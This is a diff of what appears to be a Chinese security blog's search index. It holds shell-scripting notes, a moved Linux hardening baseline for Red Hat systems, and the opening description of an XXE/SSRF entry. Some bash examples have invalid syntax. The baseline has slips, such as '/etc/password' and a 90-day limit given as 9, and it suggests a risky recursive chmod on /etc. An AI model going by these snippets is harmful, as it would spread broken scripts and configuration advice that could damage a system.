+<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> (i=1;i&lt;10;i++);<span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$int</span>&lt;=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">	<span class="built_in">let</span> <span class="string">&quot;int++&quot;</span> <span class="comment">#使用let命令，在变量计算中就不需要加上$</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="until"><a href="#until" class="headerlink" title="until"></a>until</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [! <span class="variable">$a</span> -lt 10]</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">	a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>当条件不成立的时候执行代码块</p>
+<p>当条件成立时跳出循环，与while正好相反</p>
+<h2 id="case-…-esac"><a href="#case-…-esac" class="headerlink" title="case … esac"></a>case … esac</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$num</span> <span class="keyword">in</span></span><br><span class="line">	1) <span class="built_in">echo</span> <span class="string">&#x27;你选择了1&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	2) <span class="built_in">echo</span> <span class="string">&#x27;你选择了2&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	*) <span class="built_in">echo</span> <span class="string">&#x27;请正常输入&#x27;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;这是一个函数&#x27;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">	<span class="built_in">return</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">test</span> 1 2</span><br><span class="line">func=<span class="keyword">function</span>&#123;</span><br><span class="line">	<span class="comment">#body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h1><p><a href="Untitled%20569327758ca8421ebe2a12f906547f30.csv">Untitled</a></p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>. filename</p>
+<p>source filename</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>Shell编程</tag>
+        <tag>Shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TCP-UDP-IP学习</title>
     <url>/archives/eecf3b2.html</url>
     <content><![CDATA[<h1 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h1><p>本部分笔记笔记参考网址：</p>
@@ -4277,45 +4282,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>Linux安全配置基线</title>
-    <url>/archives/7cd2fa35.html</url>
-    <content><![CDATA[<h1 id="linux安全配置基线"><a href="#linux安全配置基线" class="headerlink" title="linux安全配置基线"></a>linux安全配置基线</h1><h1 id="一、共享账号检查"><a href="#一、共享账号检查" class="headerlink" title="一、共享账号检查"></a>一、共享账号检查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户账号分配检查，避免共享账号存在</span><br><span class="line">配置要求：1、系统需按照实际用户分配账号；</span><br><span class="line">          2、避免不同用户间共享账号，避免用户账号和服务器间通信使用的账号共享。</span><br><span class="line">操作指南：参考配置操作：cat /etc/passwd查看当前所有用户的情况；</span><br><span class="line">检查方法：命令cat /etc/passwd查看当前所有用户的信息，与管理员确认是否有共享账号情况存在。</span><br><span class="line">配置方法：如需建立用户，参考如下：</span><br><span class="line">          #useradd username  #创建账号</span><br><span class="line">          #passwd username   #设置密码</span><br><span class="line">          使用该命令为不同的用户分配不同的账号，设置不同的口令及权限信息等。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="二、多余账户锁定"><a href="#二、多余账户锁定" class="headerlink" title="二、多余账户锁定"></a>二、多余账户锁定</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：多余账户锁定策略</span><br><span class="line">配置要求：应锁定与设备运行、维护等工作无关的账号。</span><br><span class="line">操作指南：参考配置操作：</span><br><span class="line">          查看锁定用户：</span><br><span class="line">          # cat /etc/password，查看哪些账户的shell域中为nologin；</span><br><span class="line">检查方法：人工检查：</span><br><span class="line">          	# cat /etc/password后查看多余账户的shell域为nologin为符合；</span><br><span class="line">          BVS基线检查：</span><br><span class="line">          	多余账户处于锁定状态为符合。</span><br><span class="line">配置方法：锁定用户：</span><br><span class="line">        修改/etc/password文件，将需要锁定的用户的shell域设为nologin；</span><br><span class="line">        或通过#passwd –l username锁定账户；</span><br><span class="line">        只有具备超级用户权限的使用者方可使用#passwd –l username锁定用户,用#passwd –d username解锁后原有密码失效，登录需输入新密码。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        一般情况下，需要锁定的用户：lp,nuucp,hpdb,www,demon</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、root账户登录控制"><a href="#三、root账户登录控制" class="headerlink" title="三、root账户登录控制"></a>三、root账户登录控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：root账户远程登录账户限制</span><br><span class="line">配置要求：1、限制具备超级管理员权限的用户远程登录。</span><br><span class="line">          2、远程执行管理员权限操作，应先以普通权限用户远程登录后，再切换到超级管理员权限账号后执行相应操作。</span><br><span class="line">操作指南：使用root账户远程尝试登陆</span><br><span class="line">检查方法：1、root远程登录不成功，提示“Not on system console”；</span><br><span class="line">         2、普通用户可以登录成功，而且可以切换到root用户；</span><br><span class="line">配置方法：修改/etc/ssh/sshd_config文件，将PermitRootLogin yes改为PermitRootLogin no，重启sshd服务。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="四、口令复杂度要求"><a href="#四、口令复杂度要求" class="headerlink" title="四、口令复杂度要求"></a>四、口令复杂度要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：操作系统口令复杂度策略</span><br><span class="line">配置要求：口令长度至少12位，并包括数字、小写字母、大写字母和特殊符号。</span><br><span class="line">操作指南：1、参考配置操作</span><br><span class="line">        # cat /etc/pam.d/system-auth，找到password模块接口的配置部分，找到类似如下的配置行：</span><br><span class="line">        password  requisite  /lib/security/$ISA/pam_cracklib.so minlen =6</span><br><span class="line">        2、补充操作说明</span><br><span class="line">        参数说明如下：</span><br><span class="line">        1、retry=N，确定用户创建密码时允许重试的次数；</span><br><span class="line">        2、minlen=N，确定密码最小长度要求，事实上，在默认配置下，此参数代表密码最小长度为N-1；</span><br><span class="line">        3、dcredit=N，当N小于0时，代表新密码中数字字符数量不得少于（-N）个。例如，dcredit=-2代表密码中要至少包含两个数字字符；</span><br><span class="line">        4、ucredit=N，当N小于0时，代表则新密码中大写字符数量不得少于（-N）个；</span><br><span class="line">        5、lcredit=N，当N小于0时，代表则新密码中小写字符数量不得少于（-N）个；</span><br><span class="line">        6、ocredit=N，当N小于0时，代表则新密码中特殊字符数量不得少于（-N）个；</span><br><span class="line">检查方法：# cat /etc/pam.d/system-auth，参考操作指南检查对应参数</span><br><span class="line">         	口令的最小长度至少12位</span><br><span class="line">         	口令最少应包含的字符数量</span><br><span class="line">         	口令中最少应包含的字母字符数量</span><br><span class="line">         	口令中最少应包含的非字母数字字符数量</span><br><span class="line">         通过以上4子项的输出综合判断该项是否满足。</span><br><span class="line">配置方法：# vi /etc/pam.d/system-auth，找到password模块接口的配置部分，按照配置要求内容修改对应属性。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="五、口令最长生存期策略"><a href="#五、口令最长生存期策略" class="headerlink" title="五、口令最长生存期策略"></a>五、口令最长生存期策略</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：口令最长生存期策略</span><br><span class="line">配置要求：要求操作系统的账户口令的最长生存期不长于90天</span><br><span class="line">操作指南：# cat /etc/login.defs文件中指定配置项，其中：</span><br><span class="line">          PASS_MAX_DAYS配置项决定密码最长使用期限；</span><br><span class="line">          PASS_MIN_DAYS配置项决定密码最短使用期限；</span><br><span class="line">          PASS_WARN_AGE配置项决定密码到期提醒时间。</span><br><span class="line">检查方法：PASS_MAX_DAYS值小于等于90为符合；</span><br><span class="line">         “对于采用静态口令认证技术的设备，账户口令的生存期不长于90天”项的当前值：表示当前的口令生存期长度。</span><br><span class="line">配置方法：vi /etc/login.defs文件，修改PASS_MAX_DAYS值为小于等于9</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="六、系统关键目录访问权限"><a href="#六、系统关键目录访问权限" class="headerlink" title="六、系统关键目录访问权限"></a>六、系统关键目录访问权限</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关键目录权限控制</span><br><span class="line">配置要求：根据安全需要，配置某些关键目录其所需的最小权限；</span><br><span class="line">          重点要求password配置文件、shadow文件、group文件权限。</span><br><span class="line">         当前主流版本的linux系统在默认情况下即对重要文件做了必要的权限设置，在日常管理和操作过程中应避免修改此类文件权限，除此以外，</span><br><span class="line">         应定期对权限进行检查及复核，确保权限设置正确。</span><br><span class="line">操作指南：查看关键目录的用户对应权限参考命令</span><br><span class="line">          ls -l /etc/passwd</span><br><span class="line">          ls -l /etc/shadow</span><br><span class="line">          ls -l /etc/group</span><br><span class="line">检查方法：与管理员确认已有权限为最小权限。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">        通过chmod命令对目录的权限进行实际设置。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        	/etc/passwd 所有用户都可读，root用户可写 –rw-r—r— </span><br><span class="line">        配置命令：chmod 644 /etc/passwd</span><br><span class="line">        	/etc/shadow 只有root可读 –r-------- </span><br><span class="line">        配置命令：chmod 600 /etc/shadow；</span><br><span class="line">        	/etc/group 必须所有用户都可读，root用户可写 –rw-r—r—</span><br><span class="line">        配置命令：chmod 644 /etc/group；</span><br><span class="line">        如果是有写权限，就需移去组及其它用户对/etc的写权限（特殊情况除外）执行命令#chmod -R go-w,o-r /etc</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="七、用户缺省权限控制"><a href="#七、用户缺省权限控制" class="headerlink" title="七、用户缺省权限控制"></a>七、用户缺省权限控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户缺省权限控制</span><br><span class="line">配置要求：控制用户缺省访问权限，当在创建新文件或目录时应屏蔽掉新文件或目录不应有的访问允许权限,防止同属于</span><br><span class="line">该组的其它用户及别的组的用户修改该用户的文件或更高限制。</span><br><span class="line">操作指南：1、# cat /etc/bashrc  查看全局默认设置umask值</span><br><span class="line">          2、查看具体用户home目录下bash_profile，具体用户的umask</span><br><span class="line">检查方法：查看全局默认设置umask值为027或更小权限为符合（如有特许权限需求，可根据实际情况判断）；</span><br><span class="line">          查看具体用户的umask，本着最小权限的原则。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          单独针对用户设置</span><br><span class="line">          可修改用户home目录下的.bash_profile脚本文件，例如，可增加一条语句：umask 027；对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">          全局默认设置：</span><br><span class="line">          默认通过全局脚本/etc/bashrc设置所有用户的默认umask值，修改脚本即可实现对用户默认umask值的全局性修改，</span><br><span class="line">          通常建议将umask设置为027以上，对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="八、安全日志完备性要求"><a href="#八、安全日志完备性要求" class="headerlink" title="八、安全日志完备性要求"></a>八、安全日志完备性要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安全日志完备性要求</span><br><span class="line">配置要求：系统应配置完备日志记录，记录对与系统相关的安全事件。</span><br><span class="line">操作指南：1、# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">          2、# cat /var/log/secure查看是否有对应配置</span><br><span class="line">检查方法：1、cat /etc/syslog.conf确认有对应配置；</span><br><span class="line">          2、查看/var/log/secure，应记录有需要的设备相关的安全事件。</span><br><span class="line">配置方法：修改配置文件vi /etc/syslog.conf。</span><br><span class="line">          配置如下类似语句：</span><br><span class="line">          authpriv.*			/var/log/secure</span><br><span class="line">          定义为需要保存的设备相关安全事件。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="九、统一远程日志服务器配置"><a href="#九、统一远程日志服务器配置" class="headerlink" title="九、统一远程日志服务器配置"></a>九、统一远程日志服务器配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：统一远程日志服务器配置</span><br><span class="line">配置要求：当前系统应配置远程日志功能，将需要重点关注的日志内容传输到日志服务器进行备份。</span><br><span class="line">操作指南：# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">检查方法：配置了远程日志服务器为符合</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">          修改配置文件vi /etc/syslog.conf，</span><br><span class="line">          加上这一行：</span><br><span class="line">          *.* @192.168.0.1</span><br><span class="line">          可以将&quot;*.*&quot;替换为你实际需要的日志信息。比如：kern.* / mail.* 等等；可以将此处192.168.0.1替换为实际的IP或域名。</span><br><span class="line">          重新启动syslog服务，执行下列命令：</span><br><span class="line">          services syslogd restart</span><br><span class="line">          2、补充操作说明</span><br><span class="line">          注意：*.*和@之间为一个Tab</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十、设置history时间戳"><a href="#十、设置history时间戳" class="headerlink" title="十、设置history时间戳"></a>十、设置history时间戳</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：设置history时间戳</span><br><span class="line">配置要求：配置history时间戳，便于审计。</span><br><span class="line">操作指南：# cat /etc/bashrc查看是否有对应配置</span><br><span class="line">检查方法：已添加，如：“export HISTTIMEFORMAT=&quot;%F %T”配置为符合。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          在/etc/bashrc文件中增加如下行：</span><br><span class="line">          export HISTTIMEFORMAT=&quot;%F %T</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十一、ssh登录配置"><a href="#十一、ssh登录配置" class="headerlink" title="十一、ssh登录配置"></a>十一、ssh登录配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：SSH登录配置</span><br><span class="line">配置要求：系统应配置使用SSH等加密协议进行远程登录维护，并安全配置SSHD的设置。不使用TELENT进行远程登录维护。</span><br><span class="line">操作指南：1、查看SSH服务状态：# ps –elf|grep ssh；</span><br><span class="line">          2、查看telnet服务状态：# ps –elf|grep telnet。</span><br><span class="line">检查方法：1、	不能使用telnet进行远程维护；</span><br><span class="line">          2、	应使用SSH进行远程维护；</span><br><span class="line">          3、	SSH配置要符合如下要求；</span><br><span class="line">              Protocol  2 #使用ssh2版本</span><br><span class="line">              X11Forwarding yes #允许窗口图形传输使用ssh加密</span><br><span class="line">              IgnoreRhosts  yes#完全禁止SSHD使用.rhosts文件</span><br><span class="line">              RhostsAuthentication no #不设置使用基于rhosts的安全验证</span><br><span class="line">              RhostsRSAAuthentication no #不设置使用RSA算法的基于rhosts的安全验证</span><br><span class="line">              HostbasedAuthentication no #不允许基于主机白名单方式认证</span><br><span class="line">              PermitRootLogin no #不允许root登录</span><br><span class="line">              PermitEmptyPasswords no #不允许空密码</span><br><span class="line">              Banner /etc/motd  #设置ssh登录时显示的banner</span><br><span class="line">          4、以上条件都满足为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            编辑 sshd_config，添加相关设置，SSHD相关安全设置选项参考检查方法中的描述。</span><br><span class="line">          2、补充操作说明</span><br><span class="line">            查看SSH服务状态：# ps –elf|grep ssh</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十二、关闭不必要的服务"><a href="#十二、关闭不必要的服务" class="headerlink" title="十二、关闭不必要的服务"></a>十二、关闭不必要的服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关闭不必要的系统服务</span><br><span class="line">配置要求：根据每台机器的不同角色，关闭不需要的系统服务。操作指南中的服务项提供参考，根据服务器的角色和应用情况对启动项进行修改。</span><br><span class="line">如无特殊需要，应关闭Sendmail、Telnet、Bind等服务。</span><br><span class="line">操作指南：执行命令 #chkconfig --list，查看哪些服务开放。</span><br><span class="line">检查方法：与管理员确认无用服务已关闭</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">        使用如下方式禁用不必要的服务</span><br><span class="line">        #service &lt;服务名&gt; stop</span><br><span class="line">        #chkconfig --level 35 off</span><br><span class="line">        2、参考说明</span><br><span class="line">        Linux/Unix系统服务中，部分服务存在较高安全风险，应当禁用，包括：</span><br><span class="line">        “lpd”，此服务为行式打印机后台程序，用于假脱机打印工作的UNIX后台程序，此服务通常情况下不用，建议禁用；</span><br><span class="line">        “telnet”，此服务采用明文传输数据，登陆信息容易被窃取，建议用ssh代替；</span><br><span class="line">        “routed”，此服务为路由守候进程，使用动态RIP路由选择协议，建议禁用；</span><br><span class="line">        “sendmail”，此服务为邮件服务守护进程，非邮件服务器应将其关闭；</span><br><span class="line">        “Bluetooth”，此服务为蓝牙服务，如果不需要蓝牙服务时应关闭；</span><br><span class="line">        “identd”，此服务为AUTH服务，在提供用户信息方面与finger类似，一般情况下该服务不是必须的，建议关闭；</span><br><span class="line">        “xfs”，此服务为Linux中X Window的字体服务，关于该服务历史上出现过信息泄露和拒绝服务等漏洞，应以减少系统风险；</span><br><span class="line">        R服务（“rlogin”、“rwho”、“rsh”、“rexec”），R服务设计上存在严重的安全缺陷，仅适用于封闭环境中信任主机之间便捷访问，</span><br><span class="line">        其他场合下均必须禁用；</span><br><span class="line">        基于inetd/xinetd的服务（daytime、chargen、echo等），此类服务建议禁用。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十三、禁止ctr-alt-del键盘关闭命令"><a href="#十三、禁止ctr-alt-del键盘关闭命令" class="headerlink" title="十三、禁止ctr+alt+del键盘关闭命令"></a>十三、禁止ctr+alt+del键盘关闭命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：禁止Control-Alt-Delete键盘关闭命令</span><br><span class="line">配置要求：应禁止使用Control-Alt-Delete组合键重启服务器，防止误操作</span><br><span class="line">操作指南：命令cat /etc/inittab，查看配置</span><br><span class="line">检查方法：/etc/inittab 中应有：“#ca::ctrlaltdel:/sbin/shutdown -t3 -r now”配置为符合。</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">            在“/etc/inittab” 文件中注释掉下面这行（使用#）： ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            改为： #ca::ctrlaltdel:/sbin/shutdown -t3 -r now  </span><br><span class="line">            为了使此改动生效，输入下面这个命令： # /sbin/init q</span><br><span class="line">        2、补充说明</span><br><span class="line">            禁止ctl-alt-del使得在控制台直接按ctl-alt-del不能重新启动计算机。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
-
-<h1 id="十四、安装操作系统补丁"><a href="#十四、安装操作系统补丁" class="headerlink" title="十四、安装操作系统补丁"></a>十四、安装操作系统补丁</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安装操作系统更新补丁</span><br><span class="line">配置要求：安装操作系统更新补丁，修复系统漏洞</span><br><span class="line">操作指南：1、查看当前系统补丁版本</span><br><span class="line">          2、检查官网当前系统版本是否发布安全更新。</span><br><span class="line">检查方法：版本应保持为最新</span><br><span class="line">配置方法：通过访问</span><br><span class="line">https://rhn.redhat.com/errata/下载补丁安装包，在打开的页面上，选择与自己使用相对应的系统后，点击连接进入补丁包下载列表界面，</span><br><span class="line">选择需要的补丁下载。</span><br><span class="line">         下载的补丁为rpm安装包，将该安装包复制到目标系统上，使用命令rpm –ivh xxx.rpm进行安装，随后重新启动系统，</span><br><span class="line">         检查所安装补丁的服务或应用程序是否运行正常，即完成该补丁的安装和升级工作。</span><br><span class="line">适用版本：Linux Redhat AS 3 Linux Redhat AS 4</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>安全基线</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE与SSRF</title>
     <url>/archives/4e6e7714.html</url>
     <content><![CDATA[<h1 id="XXE-and-SSRF"><a href="#XXE-and-SSRF" class="headerlink" title="XXE and SSRF"></a>XXE and SSRF</h1><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE-外部实体注入漏洞"><a href="#XXE-外部实体注入漏洞" class="headerlink" title="XXE - 外部实体注入漏洞"></a>XXE - 外部实体注入漏洞</h2><p>利用了网站在解析xml文件的时候，可以引入外部实体的特性，而外部实体可以使用各种协议如，php:&#x2F;&#x2F;filter ftp http file，等方式获得本地的，网络的资源，从而使我们上传的恶意dtd文件中的payload得以执行。</p>
@@ -4438,6 +4404,45 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <tag>漏洞原理</tag>
         <tag>PHP</tag>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux安全配置基线</title>
+    <url>/archives/7cd2fa35.html</url>
+    <content><![CDATA[<h1 id="linux安全配置基线"><a href="#linux安全配置基线" class="headerlink" title="linux安全配置基线"></a>linux安全配置基线</h1><h1 id="一、共享账号检查"><a href="#一、共享账号检查" class="headerlink" title="一、共享账号检查"></a>一、共享账号检查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户账号分配检查，避免共享账号存在</span><br><span class="line">配置要求：1、系统需按照实际用户分配账号；</span><br><span class="line">          2、避免不同用户间共享账号，避免用户账号和服务器间通信使用的账号共享。</span><br><span class="line">操作指南：参考配置操作：cat /etc/passwd查看当前所有用户的情况；</span><br><span class="line">检查方法：命令cat /etc/passwd查看当前所有用户的信息，与管理员确认是否有共享账号情况存在。</span><br><span class="line">配置方法：如需建立用户，参考如下：</span><br><span class="line">          #useradd username  #创建账号</span><br><span class="line">          #passwd username   #设置密码</span><br><span class="line">          使用该命令为不同的用户分配不同的账号，设置不同的口令及权限信息等。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、多余账户锁定"><a href="#二、多余账户锁定" class="headerlink" title="二、多余账户锁定"></a>二、多余账户锁定</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：多余账户锁定策略</span><br><span class="line">配置要求：应锁定与设备运行、维护等工作无关的账号。</span><br><span class="line">操作指南：参考配置操作：</span><br><span class="line">          查看锁定用户：</span><br><span class="line">          # cat /etc/password，查看哪些账户的shell域中为nologin；</span><br><span class="line">检查方法：人工检查：</span><br><span class="line">          	# cat /etc/password后查看多余账户的shell域为nologin为符合；</span><br><span class="line">          BVS基线检查：</span><br><span class="line">          	多余账户处于锁定状态为符合。</span><br><span class="line">配置方法：锁定用户：</span><br><span class="line">        修改/etc/password文件，将需要锁定的用户的shell域设为nologin；</span><br><span class="line">        或通过#passwd –l username锁定账户；</span><br><span class="line">        只有具备超级用户权限的使用者方可使用#passwd –l username锁定用户,用#passwd –d username解锁后原有密码失效，登录需输入新密码。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        一般情况下，需要锁定的用户：lp,nuucp,hpdb,www,demon</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、root账户登录控制"><a href="#三、root账户登录控制" class="headerlink" title="三、root账户登录控制"></a>三、root账户登录控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：root账户远程登录账户限制</span><br><span class="line">配置要求：1、限制具备超级管理员权限的用户远程登录。</span><br><span class="line">          2、远程执行管理员权限操作，应先以普通权限用户远程登录后，再切换到超级管理员权限账号后执行相应操作。</span><br><span class="line">操作指南：使用root账户远程尝试登陆</span><br><span class="line">检查方法：1、root远程登录不成功，提示“Not on system console”；</span><br><span class="line">         2、普通用户可以登录成功，而且可以切换到root用户；</span><br><span class="line">配置方法：修改/etc/ssh/sshd_config文件，将PermitRootLogin yes改为PermitRootLogin no，重启sshd服务。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、口令复杂度要求"><a href="#四、口令复杂度要求" class="headerlink" title="四、口令复杂度要求"></a>四、口令复杂度要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：操作系统口令复杂度策略</span><br><span class="line">配置要求：口令长度至少12位，并包括数字、小写字母、大写字母和特殊符号。</span><br><span class="line">操作指南：1、参考配置操作</span><br><span class="line">        # cat /etc/pam.d/system-auth，找到password模块接口的配置部分，找到类似如下的配置行：</span><br><span class="line">        password  requisite  /lib/security/$ISA/pam_cracklib.so minlen =6</span><br><span class="line">        2、补充操作说明</span><br><span class="line">        参数说明如下：</span><br><span class="line">        1、retry=N，确定用户创建密码时允许重试的次数；</span><br><span class="line">        2、minlen=N，确定密码最小长度要求，事实上，在默认配置下，此参数代表密码最小长度为N-1；</span><br><span class="line">        3、dcredit=N，当N小于0时，代表新密码中数字字符数量不得少于（-N）个。例如，dcredit=-2代表密码中要至少包含两个数字字符；</span><br><span class="line">        4、ucredit=N，当N小于0时，代表则新密码中大写字符数量不得少于（-N）个；</span><br><span class="line">        5、lcredit=N，当N小于0时，代表则新密码中小写字符数量不得少于（-N）个；</span><br><span class="line">        6、ocredit=N，当N小于0时，代表则新密码中特殊字符数量不得少于（-N）个；</span><br><span class="line">检查方法：# cat /etc/pam.d/system-auth，参考操作指南检查对应参数</span><br><span class="line">         	口令的最小长度至少12位</span><br><span class="line">         	口令最少应包含的字符数量</span><br><span class="line">         	口令中最少应包含的字母字符数量</span><br><span class="line">         	口令中最少应包含的非字母数字字符数量</span><br><span class="line">         通过以上4子项的输出综合判断该项是否满足。</span><br><span class="line">配置方法：# vi /etc/pam.d/system-auth，找到password模块接口的配置部分，按照配置要求内容修改对应属性。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="五、口令最长生存期策略"><a href="#五、口令最长生存期策略" class="headerlink" title="五、口令最长生存期策略"></a>五、口令最长生存期策略</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：口令最长生存期策略</span><br><span class="line">配置要求：要求操作系统的账户口令的最长生存期不长于90天</span><br><span class="line">操作指南：# cat /etc/login.defs文件中指定配置项，其中：</span><br><span class="line">          PASS_MAX_DAYS配置项决定密码最长使用期限；</span><br><span class="line">          PASS_MIN_DAYS配置项决定密码最短使用期限；</span><br><span class="line">          PASS_WARN_AGE配置项决定密码到期提醒时间。</span><br><span class="line">检查方法：PASS_MAX_DAYS值小于等于90为符合；</span><br><span class="line">         “对于采用静态口令认证技术的设备，账户口令的生存期不长于90天”项的当前值：表示当前的口令生存期长度。</span><br><span class="line">配置方法：vi /etc/login.defs文件，修改PASS_MAX_DAYS值为小于等于9</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
